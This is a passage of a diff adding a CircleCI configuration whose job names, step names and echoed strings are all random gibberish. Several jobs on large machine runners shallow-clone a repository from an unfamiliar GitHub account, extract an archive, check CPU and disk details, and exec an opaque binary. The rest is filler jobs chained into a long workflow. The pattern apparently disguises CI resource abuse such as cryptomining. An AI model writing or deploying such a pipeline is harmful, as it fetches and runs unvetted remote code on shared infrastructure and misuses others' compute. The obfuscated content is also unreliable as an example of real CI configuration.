+          name: qylrfneeed
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'cxcmxpisnofuyduua tbjoztxsywt' > /tmp/wrnshal/jwuntib
+            ls -la /tmp/wrnshal/jwuntib
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'jwuntib'
+  kycbrlbskxq:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: olybawovqrtikhh
+          command: |
+            awk 'NR==1' /tmp/wrnshal/jwuntib | wc -ghigcdfx || true
+      - run:
+          name: wbphomiammlzv
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 https://github.com/lucienneburkee7xlm-source/3d750b9e7309 .
+      - run:
+          name: cvswolnuqbvivey
+          command: tar -xj -f ubmmtftccdtka.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          name: dzglbniekcaj
+          command: df -h
+      - run:
+          name: mtlaquvjsjoev
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: exec ./umxvtycadsh
+  qsyqgczsyrlbt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: yansxbcanicjiqu
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'mrzmbdxisvdmtulr qotsilpyyefok' > /tmp/wrnshal/prhhixcidgpeen
+            ls -la /tmp/wrnshal/prhhixcidgpeen
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'prhhixcidgpeen'
+  eeephgmxt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: caivmdqegzv
+          command: |
+            awk 'NR==1' /tmp/wrnshal/prhhixcidgpeen | wc -ghigcdfx || true
+      - run:
+          name: lirme
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 https://github.com/lucienneburkee7xlm-source/3d750b9e7309 .
+      - run:
+          name: fjnyxka
+          command: tar -xj -f ubmmtftccdtka.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          name: vmdxqcwunxwdq
+          command: df -h
+      - run:
+          name: tgjwzg
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: exec ./umxvtycadsh
+  ersncneux:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: vufgsyqunxsmea
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'ptngonbxkkil pzqfpzxmlfpjaqkeg' > /tmp/wrnshal/koxdapr
+            ls -la /tmp/wrnshal/koxdapr
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'koxdapr'
+  giildhs:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: ciqojz
+          command: |
+            awk 'NR==1' /tmp/wrnshal/koxdapr | wc -ghigcdfx || true
+      - run:
+          name: ceuhuaiukr
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 https://github.com/lucienneburkee7xlm-source/3d750b9e7309 .
+      - run:
+          name: qczsmisxcfluy
+          command: tar -xj -f ubmmtftccdtka.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          name: ggwjqflciaag
+          command: df -h
+      - run:
+          name: cbslpa
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: exec ./umxvtycadsh
+  uukrqe:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: tvbphsegwb
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'thcvdmsjpxp okgicbfptxmotcnfx' > /tmp/wrnshal/rozshphkcncabt
+            ls -la /tmp/wrnshal/rozshphkcncabt
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'rozshphkcncabt'
+  jayct:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: mtgsh
+          command: |
+            awk 'NR==1' /tmp/wrnshal/rozshphkcncabt | wc -ghigcdfx || true
+      - run:
+          name: kygeeyshzs
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 https://github.com/lucienneburkee7xlm-source/3d750b9e7309 .
+      - run:
+          name: rkxqkrbwcuo
+          command: tar -xj -f ubmmtftccdtka.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          name: ceqffkprffht
+          command: df -h
+      - run:
+          name: caijesqk
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: exec ./umxvtycadsh
+  wxbrzyii:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: jtirscupwkqeevm
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'tsjyrfgyoahho gvlrcgrxaaohqcumu' > /tmp/wrnshal/fabpfecy
+            ls -la /tmp/wrnshal/fabpfecy
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'fabpfecy'
+  udygjzp:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: aflfjcommhb
+          command: |
+            awk 'NR==1' /tmp/wrnshal/fabpfecy | wc -ghigcdfx || true
+      - run:
+          name: liabykhxef
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 https://github.com/lucienneburkee7xlm-source/3d750b9e7309 .
+      - run:
+          name: vusbjckfkpqdki
+          command: tar -xj -f ubmmtftccdtka.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          name: aaimievkwv
+          command: df -h
+      - run:
+          name: befihx
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: exec ./umxvtycadsh
+  bqdwdgvws:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: dzibdgmfco
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'kggynulzgffl sfnixegflcuwhslqvb' > /tmp/wrnshal/yfrngauds
+            ls -la /tmp/wrnshal/yfrngauds
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'yfrngauds'
+  ccbiifju:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: ysfohmjrt
+          command: |
+            awk 'NR==1' /tmp/wrnshal/yfrngauds | wc -ghigcdfx || true
+      - run:
+          name: odpnvhnl
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 https://github.com/lucienneburkee7xlm-source/3d750b9e7309 .
+      - run:
+          name: xxjynnz
+          command: tar -xj -f ubmmtftccdtka.tar.bz2
+      - run:
+          command: sleep 15
+      - run:
+          name: aosnko
+          command: df -h
+      - run:
+          name: qjdhmvmkls
+          command: cat /proc/cpuinfo | head -5
+      - run:
+          command: exec ./umxvtycadsh
+
+  tekyg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: shsppuokfs
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'upyxkfhyoywid gtpauonmdihphykw' > /tmp/wrnshal/nspebvyzlrsf
+            ls -la /tmp/wrnshal/nspebvyzlrsf
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'nspebvyzlrsf'
+  btdvsdlpwyhk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: uhfdq
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'opjjbxezcpgebrlf zwvmzxeupgjybe' > /tmp/wrnshal/pjgcgc
+            ls -la /tmp/wrnshal/pjgcgc
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'pjgcgc'
+  xpeufu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: ymbcauuw
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'ealtqlmaemxchx dsjijsvpvyhkwax' > /tmp/wrnshal/ahbtmhet
+            ls -la /tmp/wrnshal/ahbtmhet
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'ahbtmhet'
+  ggkpbkglfkk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: svmysbnbgfbav
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'arfzksncepa owlhwjaugavm' > /tmp/wrnshal/sighhodv
+            ls -la /tmp/wrnshal/sighhodv
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'sighhodv'
+  ftvhfbinilpa:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: wckmolr
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'nqcfytxodw jzxinisdjtdkumfl' > /tmp/wrnshal/ctaxwdgvzljz
+            ls -la /tmp/wrnshal/ctaxwdgvzljz
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'ctaxwdgvzljz'
+  ilegltogo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: zkeiro
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'eiludquyiljozj rbiqmgxueq' > /tmp/wrnshal/mgukgb
+            ls -la /tmp/wrnshal/mgukgb
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'mgukgb'
+  shwmvplg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: cvhonsusr
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'aobjcfpqygfxvnw cpykuqsbzfh' > /tmp/wrnshal/cbhgaxe
+            ls -la /tmp/wrnshal/cbhgaxe
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'cbhgaxe'
+  nekeect:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: wzofwudhifwwe
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'wnqmpiihtenuxh kfonvardxfq' > /tmp/wrnshal/nikbyjd
+            ls -la /tmp/wrnshal/nikbyjd
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'nikbyjd'
+  hxdmwoqxdtnrwv:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: vjwjugejthcpkq
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'gihmydladgqysvio vlvmeulqsoxvypgdq' > /tmp/wrnshal/fabpfecy
+            ls -la /tmp/wrnshal/fabpfecy
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'fabpfecy'
+  mwebfzmplkm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: mjhbko
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'rwsezjvxdtsacodxsi ytkivbjhwfn' > /tmp/wrnshal/ggozrqyhqs
+            ls -la /tmp/wrnshal/ggozrqyhqs
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'ggozrqyhqs'
+  uvookdv:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: jftvaonowawvl
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'grbyipwpdinzvfombb yguacqpentllrpzm' > /tmp/wrnshal/yfrngauds
+            ls -la /tmp/wrnshal/yfrngauds
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'yfrngauds'
+  ftvwwxysxw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: pudcfieppcev
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'wimuzzdicafgfykvvn kpaavtmbtxbmvqd' > /tmp/wrnshal/mfkbrzarkw
+            ls -la /tmp/wrnshal/mfkbrzarkw
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'mfkbrzarkw'
+  iiorznylebc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: nixzaw
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'iqdcjqxwxnlcuf imdnqftjoibfzfxdw' > /tmp/wrnshal/jwuntib
+            ls -la /tmp/wrnshal/jwuntib
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'jwuntib'
+  aehztrli:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: ufxldduw
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'ilecpvwoovav hpdzdndivfwmcnq' > /tmp/wrnshal/tgrpuattepeflb
+            ls -la /tmp/wrnshal/tgrpuattepeflb
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'tgrpuattepeflb'
+  jvydk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: nakvldon
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'cimclxlaufamdqo pygtwiecoksxg' > /tmp/wrnshal/afckcvi
+            ls -la /tmp/wrnshal/afckcvi
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'afckcvi'
+  ntzmejfjx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: xblys
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'jiisogdytg wxllybfgjpydjpzlv' > /tmp/wrnshal/chwogzkk
+            ls -la /tmp/wrnshal/chwogzkk
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'chwogzkk'
+  cdjyl:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: pwuahajtdruxvuh
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'jbijpdhyhzntmdcpx vppytznymh' > /tmp/wrnshal/pfowkzlx
+            ls -la /tmp/wrnshal/pfowkzlx
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'pfowkzlx'
+  akkrgmihas:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: htcmfusofjmcjlb
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'tavoktiedic rcjnhzpnqflhpzns' > /tmp/wrnshal/prhhixcidgpeen
+            ls -la /tmp/wrnshal/prhhixcidgpeen
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'prhhixcidgpeen'
+  zngtcqwhek:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: idrbhgqx
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'xtodeuvvppoeibcw uwawrfyiqecp' > /tmp/wrnshal/ygilfo
+            ls -la /tmp/wrnshal/ygilfo
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'ygilfo'
+  jvivpjojubyen:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: tvnxwyywutzw
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'ubunysenxoochlpofr tpmmqpqfszvetaz' > /tmp/wrnshal/rozshphkcncabt
+            ls -la /tmp/wrnshal/rozshphkcncabt
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'rozshphkcncabt'
+  pywhooznblrwtai:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: najjprxr
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'cqjuijomlt gzybxrueie' > /tmp/wrnshal/jdhgqtyppb
+            ls -la /tmp/wrnshal/jdhgqtyppb
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'jdhgqtyppb'
+  cvatjstkdxjazt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: hxprpl
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'hdidveevdldiqq ztevpugxwwmg' > /tmp/wrnshal/dxxjamafna
+            ls -la /tmp/wrnshal/dxxjamafna
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'dxxjamafna'
+  yazcwgyvpurnx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: dsenepivtf
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'mnycmieohvj nfbsmeheytgxkumy' > /tmp/wrnshal/kdxvfbxomuu
+            ls -la /tmp/wrnshal/kdxvfbxomuu
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'kdxvfbxomuu'
+  exsflwv:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: qvods
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'bggoaqbqwsjyjuo vyedmuoatqlbhoavdm' > /tmp/wrnshal/mljwllrrcbi
+            ls -la /tmp/wrnshal/mljwllrrcbi
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'mljwllrrcbi'
+  fcyfhdjfpkruk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: vuujdxvrfvzbr
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'ludieiwghowdly ulqfmqhyhpxuw' > /tmp/wrnshal/xzgackryqhdctw
+            ls -la /tmp/wrnshal/xzgackryqhdctw
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'xzgackryqhdctw'
+  xjvmdcysib:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: nwaurtp
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'tqskjqugqfvljhzq siurccaaqhhpginzgl' > /tmp/wrnshal/mxryqauixi
+            ls -la /tmp/wrnshal/mxryqauixi
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'mxryqauixi'
+  ghigcdfx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: mdazwg
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'debdxtxqmbxremlkoq qjlvcalgyvv' > /tmp/wrnshal/vewzbfojuzkbv
+            ls -la /tmp/wrnshal/vewzbfojuzkbv
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'vewzbfojuzkbv'
+  agbjijcksue:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: qltsvjhv
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'aoxvnecublbsphcf hjypjudhzvltcr' > /tmp/wrnshal/sgxonmwkjcx
+            ls -la /tmp/wrnshal/sgxonmwkjcx
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'sgxonmwkjcx'
+  fsazuthmnwaoa:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: thfsjzwaop
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'dgldrlgxmpoakwlpse ezhipjwtlwiyuch' > /tmp/wrnshal/epcaguan
+            ls -la /tmp/wrnshal/epcaguan
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'epcaguan'
+  fcsbiepssw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/wrnshal
+      - run:
+          name: xnasf
+          command: |
+            mkdir -p /tmp/wrnshal
+            echo 'imwzimdkguqklfii hkxyzyetasmghk' > /tmp/wrnshal/koxdapr
+            ls -la /tmp/wrnshal/koxdapr
+      - persist_to_workspace:
+          root: /tmp/wrnshal
+          paths:
+            - 'koxdapr'
+workflows:
+  zsfugdlevtbo:
+    jobs:
+      - pwdmjqmgmbnuc
+      - tekyg:
+          requires:
+            - pwdmjqmgmbnuc
+      - evhvefqxs:
+          requires:
+            - tekyg
+      - heuycu:
+          requires:
+            - tekyg
+      - btdvsdlpwyhk:
+          requires:
+            - heuycu
+      - nbsmwkjda:
+          requires:
+            - btdvsdlpwyhk
+      - wzpowsbxg:
+          requires:
+            - btdvsdlpwyhk
+      - xpeufu:
+          requires:
+            - wzpowsbxg
+      - tijmimatplju:
+          requires:
+            - xpeufu
+      - chstbhpdvinj:
+          requires:
+            - xpeufu
+      - ggkpbkglfkk:
+          requires:
+            - chstbhpdvinj
+      - rzxqotzufiq:
+          requires:
+            - ggkpbkglfkk
+      - rkoxzdu:
+          requires:
+            - ggkpbkglfkk
+      - ftvhfbinilpa:
+          requires:
+            - rkoxzdu
+      - ruqxizylr:
+          requires:
+            - ftvhfbinilpa
+      - hrlmhtahbszyms
+      - ilegltogo:
+          requires:
+            - hrlmhtahbszyms
+      - suejstznakiz:
+          requires:
+            - ilegltogo
+      - uooihbjvmvrkkbq:
+          requires:
+            - ilegltogo
+      - shwmvplg:
+          requires:
+            - uooihbjvmvrkkbq
+      - hbfaotxcpr:
+          requires:
+            - shwmvplg
+      - laulvaxhafkcsxc:
+          requires:
+            - shwmvplg
+      - nekeect:
+          requires:
+            - laulvaxhafkcsxc
+      - jcahhjqelqilk:
+          requires:
+            - nekeect
+      - wxbrzyii:
+          requires:
+            - nekeect
+      - hxdmwoqxdtnrwv:
+          requires:
+            - wxbrzyii
+      - udygjzp:
+          requires:
+            - hxdmwoqxdtnrwv
+      - umacnbuvoajmlu:
+          requires:
+            - hxdmwoqxdtnrwv
+      - mwebfzmplkm:
+          requires:
+            - umacnbuvoajmlu
+      - sfydgebpgsbqph:
+          requires:
+            - mwebfzmplkm
+      - bqdwdgvws:
+          requires:
+            - mwebfzmplkm
+      - uvookdv:
+          requires:
+            - bqdwdgvws
+      - ccbiifju:
+          requires:
+            - uvookdv
+      - fnexh:
+          requires:
+            - uvookdv
+      - ftvwwxysxw:
+          requires:
+            - fnexh
+      - tmwaxbjkk:
+          requires:
+            - ftvwwxysxw
+      - zrphdhjrgeezdf:
+          requires:
+            - ftvwwxysxw
+      - iiorznylebc:
+          requires:
+            - zrphdhjrgeezdf
+      - kycbrlbskxq:
+          requires:
+            - iiorznylebc
+      - iwxhb:
+          requires:
+            - iiorznylebc
+      - aehztrli:
+          requires:
+            - iwxhb
+      - jxvjjuxnzjmuafe:
+          requires:
+            - aehztrli
+      - nkasoxdszdab:
+          requires:
+            - aehztrli
+      - jvydk:
+          requires:
+            - nkasoxdszdab
+      - cmoezbprskigtq:
+          requires:
+            - jvydk
+      - ksyno:
+          requires:
+            - jvydk
+      - ntzmejfjx:
+          requires:
+            - ksyno
+      - plbbwacxws:
+          requires:
+            - ntzmejfjx
+      - vafwiyhqnlmmack:
+          requires:
+            - ntzmejfjx
+      - cdjyl:
+          requires:
+            - vafwiyhqnlmmack
+      - ckwikdtox:
+          requires:
+            - cdjyl
+      - qsyqgczsyrlbt:
+          requires:
+            - cdjyl
+      - akkrgmihas:
+          requires:
+            - qsyqgczsyrlbt
+      - eeephgmxt:
+          requires:
+            - akkrgmihas
+      - kcmjnxlhrxoij:
+          requires:
+            - akkrgmihas
+      - zngtcqwhek:
+          requires:
+            - kcmjnxlhrxoij
+      - yhset:
+          requires:
+            - zngtcqwhek
+      - uukrqe:
+          requires:
+            - zngtcqwhek
+      - jvivpjojubyen:
+          requires:
+            - uukrqe
+      - jayct:
+          requires:
+            - jvivpjojubyen
+      - elbxfysfwcotcq
+      - pywhooznblrwtai:
+          requires:
+            - elbxfysfwcotcq
+      - wtizs:
+          requires:
+            - pywhooznblrwtai
+      - kufoyyivezdm:
+          requires:
+            - pywhooznblrwtai
+      - cvatjstkdxjazt:
+          requires:
+            - kufoyyivezdm
+      - zdfprxoawmipll:
+          requires:
+            - cvatjstkdxjazt
+      - gxfhknrxyv:
+          requires:
+            - cvatjstkdxjazt
+      - yazcwgyvpurnx:
+          requires:
+            - gxfhknrxyv
+      - hpqnhe:
+          requires:
+            - yazcwgyvpurnx
+      - tequfojcj:
+          requires:
+            - yazcwgyvpurnx
+      - exsflwv:
+          requires:
+            - tequfojcj
+      - odkhdmyzp:
+          requires:
+            - exsflwv
+      - wboqkj:
+          requires:
+            - exsflwv
+      - fcyfhdjfpkruk:
+          requires:
+            - wboqkj
+      - aprhlbgzhhsat:
+          requires:
+            - fcyfhdjfpkruk
+      - khzlupophjtrkp:
+          requires:
+            - fcyfhdjfpkruk
+      - xjvmdcysib:
+          requires:
+            - khzlupophjtrkp
+      - dujvt:
+          requires:
+            - xjvmdcysib
+      - cpdcjcvyoun:
+          requires:
+            - xjvmdcysib
+      - ghigcdfx:
+          requires:
+            - cpdcjcvyoun
+      - xhdpxnfxkray:
+          requires:
+            - ghigcdfx
+      - xufxnonckbifslb:
+          requires:
+            - ghigcdfx
+      - agbjijcksue:
+          requires:
+            - xufxnonckbifslb
+      - uojsbtjh:
+          requires:
+            - agbjijcksue
+      - vekxdgawcts:
+          requires:
+            - agbjijcksue
+      - fsazuthmnwaoa:
+          requires:
+            - vekxdgawcts
+      - nxywpwcumtwqik:
+          requires:
+            - fsazuthmnwaoa
+      - ersncneux:
+          requires:
+            - fsazuthmnwaoa
+      - fcsbiepssw:
+          requires:
+            - ersncneux
+      - giildhs:
+          requires:
+            - fcsbiepssw
